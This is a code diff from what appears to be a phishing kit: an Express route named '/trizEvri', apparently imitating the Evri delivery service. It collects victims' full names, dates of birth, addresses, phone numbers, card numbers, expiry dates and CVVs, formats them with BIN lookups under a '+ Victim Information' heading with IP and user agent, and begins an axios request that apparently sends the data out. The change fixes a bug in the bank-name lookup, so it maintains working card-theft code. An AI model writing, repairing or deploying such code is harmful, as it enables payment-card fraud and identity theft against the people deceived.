@@ -10544,11 +10544,12 @@ app.post("/trizEvri", (req, res) => {
       if (!resp.data.bank) {
         bankName = "";
       } else {
-        binInfo = resp.data;
+        bankName = resp.data.bank.name;
       }
+      binInfo = resp.data;
     })
     .then(function () {
-      var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${binInfo.bank.name}`;
+      var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
       var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
 
       axios
